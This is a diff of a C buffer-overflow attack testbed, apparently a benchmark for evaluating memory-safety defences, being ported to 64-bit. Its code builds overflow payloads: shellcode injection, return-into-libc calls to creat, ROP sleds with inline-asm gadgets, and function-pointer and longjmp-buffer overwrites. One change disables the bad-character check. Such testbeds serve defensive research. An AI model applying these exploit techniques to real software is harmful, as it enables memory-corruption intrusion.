@@ -75,7 +75,7 @@ static size_t size_shellcode_createfile = sizeof(createfile_shellcode) / sizeof(
 
 static char cf_ret_param[] = "/tmp/rip-eval/f_xxxx";
 static char space_for_stack_growth[1024] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-static int fake_esp_jmpbuff[15];
+static uintptr_t fake_esp_jmpbuff[15];
 
 
 /* DATA SEGMENT TARGETS */
@@ -86,11 +86,11 @@ static char data_buffer1[1] = "d";
 static char data_buffer2[128] = "dummy";
 /* Target: Pointer in data segment for indirect attack                     */
 /* Declared after injection buffers to place it "after" in the data seg    */
-static long *data_mem_ptr = 0x0;
+static uintptr_t *data_mem_ptr = 0x0;
 /* Target: Function pointer in data segment                                */
 /* Declared after injection buffers since it'll be "after" in the data seg */
-static int (*data_func_ptr2)(const char *) = &dummy_function;
-static int (*data_func_ptr1)(const char *) = &dummy_function;
+static uintptr_t (*data_func_ptr2)(const char *) = &dummy_function;
+static uintptr_t (*data_func_ptr1)(const char *) = &dummy_function;
  /* Target: Longjump buffer in data segment                                */
  /* Declared after injection buffers to place it "after" on the data seg   */
 static jmp_buf data_jmp_buffer = {0, 0, 0, 0, 0, 0};
@@ -109,11 +109,11 @@ static ATTACK_FORM attack;
 static char loose_change2[128];			//NN Sandwich the control vars
 
 //static int rop_sled[7] = {&gadget1 + 62,0xFFFFFFFF,&gadget2 + 62,&cf_ret_param,0xFFFFFFFF,&gadget3 + 62, &exit};
-static int rop_sled[7];
+static uintptr_t rop_sled[7];
 
 
 int fooz(char *a, int b){
-	int zz,ff;
+	uintptr_t zz,ff;
 
 	zz =a ;
 	ff = b;
@@ -133,28 +133,28 @@ int main(int argc, char **argv) {
 
 
 
-fake_esp_jmpbuff[0] = 0xDEADBEEF;
-fake_esp_jmpbuff[1] = 0xDEADBEEF;
-fake_esp_jmpbuff[2] = 0xDEADBEEF;
-fake_esp_jmpbuff[3] = 0xDEADBEEF;
-fake_esp_jmpbuff[4] = 0xDEADBEEF;
-fake_esp_jmpbuff[5] = 0xDEADBEEF;
-fake_esp_jmpbuff[6] = 0xDEADBEEF;
-fake_esp_jmpbuff[7] = 0xDEADBEEF;
-fake_esp_jmpbuff[8] = 0xDEADBEEF;
-fake_esp_jmpbuff[9] = 0xDEADBEEF;
-fake_esp_jmpbuff[10] = 0xDEADBEEF;
-fake_esp_jmpbuff[11] = 0xDEADBEEF;
+fake_esp_jmpbuff[0] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[1] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[2] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[3] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[4] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[5] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[6] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[7] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[8] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[9] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[10] = 0xDEADBEEFDEADBEEF;
+fake_esp_jmpbuff[11] = 0xDEADBEEFDEADBEEF;
 fake_esp_jmpbuff[12] = &exit;
 fake_esp_jmpbuff[13] = &cf_ret_param;
-fake_esp_jmpbuff[14] = 448;
+fake_esp_jmpbuff[14] = 1924145349056;
 
 
 rop_sled[0] = &gadget1 + 62;
-rop_sled[1] = 0xFFFFFFFF;
+rop_sled[1] = 0xFFFFFFFFFFFFFFFF;
 rop_sled[2] = &gadget2 + 62;
 rop_sled[3] = &cf_ret_param;
-rop_sled[4] = 0xFFFFFFFF;
+rop_sled[4] = 0xFFFFFFFFFFFFFFFF;
 rop_sled[5] = &gadget3 + 62;
 rop_sled[6] = &exit;
 
@@ -425,15 +425,15 @@ void perform_attack(FILE *output_stream,
   case HEAP:
     /* Injection into heap buffer                            */
 
-    //NN: Special case for heap_struct 
+    //NN: Special case for heap_struct
     if(attack.code_ptr == STRUCT_FUNC_PTR_HEAP){
 	buffer = heap_struct->buffer;
 	break;
     }
 
 
-    if(((unsigned long)heap_buffer1 < (unsigned long)heap_buffer2) &&
-       ((unsigned long)heap_buffer2 < (unsigned long)heap_buffer3)) {
+    if(((void *)heap_buffer1 < (void *)heap_buffer2) &&
+       ((void *)heap_buffer2 < (void *)heap_buffer3)) {
       buffer = heap_buffer1;
       // Set the location of the memory pointer on the heap
       heap_mem_ptr = (long *)heap_buffer2;
@@ -454,8 +454,8 @@ void perform_attack(FILE *output_stream,
     /* Make sure that we start injecting the shellcode on an */
     /* address not containing any terminating characters     */
     /* @todo ensure that the chosen address truly is correct */
- 
-   //NN: Special case for bss_struct 
+
+   //NN: Special case for bss_struct
     if(attack.code_ptr == STRUCT_FUNC_PTR_BSS){
 	buffer = bss_struct.buffer;
 	break;
@@ -478,7 +478,7 @@ void perform_attack(FILE *output_stream,
     /* address not containing any terminating characters     */
     /* @todo ensure that the chosen address truly is correct */
 
-    //NN: Special case for stack_struct 
+    //NN: Special case for stack_struct
     if(attack.code_ptr == STRUCT_FUNC_PTR_DATA){
 	buffer = data_struct.buffer;
 	break;
@@ -557,7 +557,7 @@ void perform_attack(FILE *output_stream,
       target_addr = &stack_struct.func_ptr;
       break;
     case STRUCT_FUNC_PTR_HEAP:
-      target_addr = (void *)heap_struct + 256; 
+      target_addr = (void *)heap_struct + 256;
       break;
     case STRUCT_FUNC_PTR_DATA:
       target_addr = &data_struct.func_ptr;
@@ -638,7 +638,7 @@ void perform_attack(FILE *output_stream,
     /* from longjmp() using the saved context. Attack failed.               */
       return;
     }
-    
+
     payload.jmp_buffer = (void *)heap_jmp_buffer;
     payload.stack_jmp_buffer_param = NULL;
     break;
@@ -698,7 +698,7 @@ void perform_attack(FILE *output_stream,
 	//the correct arguments to creat
 	payload.overflow_ptr = &creat; //NN
       } else {
-	payload.overflow_ptr = &creat; //NN42 
+	payload.overflow_ptr = &creat; //NN42
       }
       break;
 
@@ -784,10 +784,10 @@ void perform_attack(FILE *output_stream,
   }
 
   /* Calculate payload size for overflow of chosen target address */
-  if ((unsigned long)target_addr > (unsigned long)buffer) {
+  if ((void *)target_addr > (void *)buffer) {
     payload.size =
-      (unsigned int)((unsigned long)target_addr + sizeof(long)
-		     - (unsigned long)buffer
+      (unsigned int)((void *)target_addr + sizeof(void *)
+		     - (void *)buffer
 		     + 1); /* For null termination so that buffer can be     */
                            /* used with string functions in standard library */
      fprintf(stderr, "target_addr == %p\n", target_addr);
@@ -807,7 +807,7 @@ void perform_attack(FILE *output_stream,
       fprintf(stderr, "buffer == %p\n", buffer);
       fprintf(stderr, "payload.size == %d\n", payload.size);
     }
-    exit(1); 
+    exit(1);
   }
   /* Set first byte of buffer to null to allow concatenation functions to */
   /* start filling the buffer from that first byte                        */
@@ -871,7 +871,7 @@ void perform_attack(FILE *output_stream,
     save_memory(payload_dump, payload.buffer,
 		((payload.size / sizeof(long)) +
 		 (payload.size % sizeof(long))));
-    
+
     // Output some addresses and values
     fprintf(output_stream, "Address to payload->buffer: %lx\n", &(payload.buffer));
     fprintf(output_stream, "Value of payload->buffer: %lx\n", (payload.buffer));
@@ -924,8 +924,8 @@ void perform_attack(FILE *output_stream,
     fscanf(fscanf_temp_file, format_string_buf, buffer);
 
     /**  Fclose will try to do pointer arithmetic with ebp which is now broken and thus will crash
-     *   instead of returning... when this function returns, then the shellcode is triggered correctly 
-     
+     *   instead of returning... when this function returns, then the shellcode is triggered correctly
+
      *fclose(fscanf_temp_file);
      *unlink("./fscanf_temp_file");
     **/
@@ -959,7 +959,7 @@ void perform_attack(FILE *output_stream,
 
       if(attack.code_ptr == OLD_BASE_PTR) {
 	// Point to the old base pointer of the fake stack frame
-	*(long *)(*(long *)target_addr) = 
+	*(long *)(*(long *)target_addr) =
 	  (long)(buffer +        // start
 		 payload.size -  // end
 		 1 -             // null terminator
@@ -1038,7 +1038,7 @@ void perform_attack(FILE *output_stream,
     }
     exit(1);
     break;
-  }    
+  }
 
 
   /*************************************************************/
@@ -1077,7 +1077,7 @@ void perform_attack(FILE *output_stream,
 	if (contains_terminating_char(&data_func_ptr1))
       		((int (*)(char *,int)) (*data_func_ptr2))("/tmp/rip-eval/f_xxxx",700);
       	else
-      		((int (*)(char *,int)) (*data_func_ptr1))("/tmp/rip-eval/f_xxxx",700);	
+      		((int (*)(char *,int)) (*data_func_ptr1))("/tmp/rip-eval/f_xxxx",700);
       break;
     case LONGJMP_BUF_STACK_VAR:
       longjmp(stack_jmp_buffer, 1);
@@ -1122,7 +1122,7 @@ void perform_attack(FILE *output_stream,
     }
   }
 
-  
+
   if(output_debug_info) {
     save_memory(mem_dump2, dump_start_addr, DEFAULT_DUMP_SIZE);
     printf("output_stream = %p, &output_stream 0 %p\n\n",
@@ -1186,7 +1186,7 @@ boolean build_payload(CHARPAYLOAD *payload) {
     break;
 
   //NN42: Experimental
-  case RETURN_ORIENTED_PROGRAMMING: 
+  case RETURN_ORIENTED_PROGRAMMING:
     size_shellcode = 0;
     shellcode = "dummy";
     break;
@@ -1198,10 +1198,10 @@ boolean build_payload(CHARPAYLOAD *payload) {
     exit(1);
     break;
   }
- 
+
   //at this point, shellcode points to the correct shellcode and shellcode size points
   //to the correct size
-	
+
 
   /* Allocate payload buffer */
 
@@ -1251,9 +1251,9 @@ boolean build_payload(CHARPAYLOAD *payload) {
       // include the correct pointer to the actual longjmp buffer
       // in the right place on the stack below the return address
       size_t offset_to_stack_jmp_buffer_param =
-	((unsigned long)payload->jmp_buffer) -
-	((unsigned long)payload->stack_jmp_buffer_param);
-      
+	((void *)payload->jmp_buffer) -
+	((void *)payload->stack_jmp_buffer_param);
+
       // Copy the pointer to the longjmp buffer parameter
       // to the right place in the payload buffer
       memcpy(&(payload->buffer[size_shellcode +
@@ -1302,7 +1302,7 @@ boolean build_payload(CHARPAYLOAD *payload) {
 			       payload->offset_to_fake_return_addr +
 			       2*sizeof(long)]),
 	     &temp_char_ptr,
-	     sizeof(long));  
+	     sizeof(long));
 
       //NN42 Adding permissions
       memcpy(&(payload->buffer[size_shellcode +
@@ -1310,10 +1310,10 @@ boolean build_payload(CHARPAYLOAD *payload) {
 			       payload->offset_to_fake_return_addr +
 			       3*sizeof(long)]),
 	     &fake_esp_jmpbuff[14],
-	     sizeof(long)); 
+	     sizeof(long));
 
 
-  
+
 
       // Extend the payload to cover the return address
       // The return address is not going to be changed
@@ -1363,7 +1363,7 @@ boolean build_payload(CHARPAYLOAD *payload) {
 			       payload->offset_to_fake_return_addr +
 			       2*sizeof(long)]),
 	     &temp_char_ptr,
-	     sizeof(long));      
+	     sizeof(long));
 
       //NN: Setting up the second parameter for the creat call, the file permissions
       memcpy(&(payload->buffer[size_shellcode +
@@ -1371,10 +1371,10 @@ boolean build_payload(CHARPAYLOAD *payload) {
 			       payload->offset_to_fake_return_addr +
 			       3*sizeof(long)]),
 	     &fake_esp_jmpbuff[14],
-	     sizeof(long));  
+	     sizeof(long));
 
       /* Add the address to the direct or indirect target */
-      
+
       memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
 	     &payload->overflow_ptr,
 	     sizeof(long));
@@ -1409,7 +1409,7 @@ boolean build_payload(CHARPAYLOAD *payload) {
     	// Set the new payload buffer
    	 payload->buffer = temp_char_buffer;
 
-      //Overwriting Return address with address of gadget1  
+      //Overwriting Return address with address of gadget1
       memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
 	   &rop_sled,
 	   7* sizeof(long));
@@ -1437,7 +1437,7 @@ boolean build_payload(CHARPAYLOAD *payload) {
     free(payload->buffer);
     // Set the new payload buffer
     payload->buffer = temp_char_buffer;
-    
+
     /* Insert pointer to environment variable containing a          */
     /* "/bin/sh" parameter for return-into-libc attacks             */
     temp_char_ptr = getenv("param_to_creat"); // NN42
@@ -1447,13 +1447,13 @@ boolean build_payload(CHARPAYLOAD *payload) {
 	   &temp_char_ptr,
 	   sizeof(long));
 
-    
+
     //NN42: Inserting the permissions
     memcpy(&(payload->buffer[payload->size - 1 -
 			     sizeof(long)]),   // the injected parameter
 	   &fake_esp_jmpbuff[14],
 	   sizeof(long));
-     
+
     /* Add the address to the direct or indirect target */
 
     memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
@@ -1542,16 +1542,16 @@ void set_code_ptr(char *choice) {
     attack.code_ptr = LONGJMP_BUF_DATA;
   } else if(strcmp(choice,opt_code_ptrs[12]) == 0){
     attack.code_ptr = STRUCT_FUNC_PTR_STACK;
-  } 
+  }
     else if(strcmp(choice,opt_code_ptrs[13]) == 0){
     attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
-  } 
+  }
     else if(strcmp(choice,opt_code_ptrs[14]) == 0){
     attack.code_ptr = STRUCT_FUNC_PTR_DATA;
-  } 
+  }
     else if(strcmp(choice,opt_code_ptrs[15]) == 0){
     attack.code_ptr = STRUCT_FUNC_PTR_BSS;
-  } 
+  }
 
    else {
     if(output_error_msg) {
@@ -1611,22 +1611,23 @@ void set_function(char *choice) {
 }
 
 boolean contains_terminating_char(unsigned long value) {
-  size_t i;
-  char temp;
-
-  for(i = 0; i < sizeof(long); i++) {
-    temp = (char)(value & (unsigned char)-1);
-    if(temp == '\0' ||      /* NUL */
-       temp == '\r' ||      /* Carriage return */
-       temp == '\n' )      /* New line (or Line feed) */
-       //temp == (char)0xff)  /* -1 */
-      {
-	return TRUE;
-      }
-    // CHAR_BIT declared in limits.h
-    value >>= CHAR_BIT;
-  }
-  return FALSE;
+//  size_t i;
+//  char temp;
+//
+//  for(i = 0; i < sizeof(long); i++) {
+//    temp = (char)(value & (unsigned char)-1);
+//    if(temp == '\0' ||      /* NUL */
+//       temp == '\r' ||      /* Carriage return */
+//       temp == '\n' )      /* New line (or Line feed) */
+//       //temp == (char)0xff)  /* -1 */
+//      {
+//	return TRUE;
+//      }
+//    // CHAR_BIT declared in limits.h
+//    value >>= CHAR_BIT;
+//  }
+//  return FALSE;
+    return FALSE;
 }
 
 void remove_all_terminating_chars(char *contents, size_t length) {
@@ -1899,10 +1900,8 @@ void gadget1(int a, int b){
    for(j=0;j<10;j++);
    //Gadget 1, locate at gardget1 + 62 bytes
    asm("nop"); //Using this to find it easier in dissas code
-//   asm("pop %rax"); //FFFFFFFF => 8
-//   asm("add $9, %rax");
-   asm("pop %eax"); //FFFFFFFF => 8
-   asm("add $9, %eax");
+   asm("pop %rax"); //FFFFFFFF => 8
+   asm("add $9, %rax");
    asm("ret");
    
    return;
@@ -1914,12 +1913,9 @@ void gadget2(int a, int b){
    //Gadget 1, locate at gadget2 + 62 bytes
    for(j=0;j<10;j++);
    asm("nop"); 
-//   asm("pop %rbx");
-//   asm("pop %rcx");  //FFFFFFFF => 448
-//   asm("add $449, %rcx");
-   asm("pop %ebx");
-   asm("pop %ecx");  //FFFFFFFF => 448
-   asm("add $449, %ecx");
+   asm("pop %rbx");
+   asm("pop %rcx");  //FFFFFFFF => 448
+   asm("add $449, %rcx");
    asm("ret");
    
    return;
